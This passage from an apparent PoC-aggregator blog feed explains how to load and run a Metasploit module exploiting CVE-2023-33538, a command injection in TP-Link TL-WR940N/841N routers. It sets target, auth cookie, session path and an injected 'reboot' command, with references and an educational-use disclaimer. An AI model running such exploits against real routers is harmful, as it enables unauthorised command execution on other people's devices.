id="How-to-run-this-module"><a href="#How-to-run-this-module" class="headerlink" title="How to run this module?"></a>How to run this module?</h3><ol><li>Copy the <code>.rb</code> file into your Metasploit modules folder, for example:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> tplink_ssid1_rce.rb /usr/share/metasploit-framework/modules/auxiliary/admin/http/<br></code></pre></td></tr></table></figure><ol start="2"><li>Start Metasploit console:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure><ol start="3"><li>Search and use the module:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search tplink<br>use auxiliary/admin/http/tplink_ssid1_rce.rb<br></code></pre></td></tr></table></figure><ol start="4"><li>Set required options:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.0.1<br><span class="hljs-built_in">set</span> RPORT 80<br><span class="hljs-built_in">set</span> AUTHCOOKIE Basic%20YWRtaW46YWRtaW4%3D<br><span class="hljs-built_in">set</span> SESSIONPATH /ABCD1234/<br><span class="hljs-built_in">set</span> CMD reboot<br>run<br></code></pre></td></tr></table></figure><p> The module <strong>does not</strong> perform authentication. You must manually extract the <code>Authorization</code> cookie and session prefix from a successful login to the router’s web interface.</p><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33538">https://nvd.nist.gov/vuln/detail/CVE-2023-33538</a>  </li><li><a href="https://web.archive.org/web/20230609111043/https://github.com/a101e-IoTvul/iotvul/blob/main/tp-link/3/TL-WR940N_TL-WR841N_userRpm_WlanNetworkRpm_Command_Injection.md">https://web.archive.org/web/20230609111043/https://github.com/a101e-IoTvul/iotvul/blob/main/tp-link/3/TL-WR940N_TL-WR841N_userRpm_WlanNetworkRpm_Command_Injection.md</a></li></ul><hr><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This module is intended <strong>for educational purposes only</strong>.<br><strong>Do not use this code against devices or infrastructure you do not own or have explicit permission to test.</strong></p><hr><h3 id="Issues"><a href="#Issues" class="headerlink" title="Issues"></a>Issues</h3><p>If you find bugs, or have ideas for improvements – feel free to open an issue or leave a comment. Let’s make it better together.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; TP-Link TL-WR940N&amp;#x2F;841N 命令注入漏洞&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
     
   </entry>
   
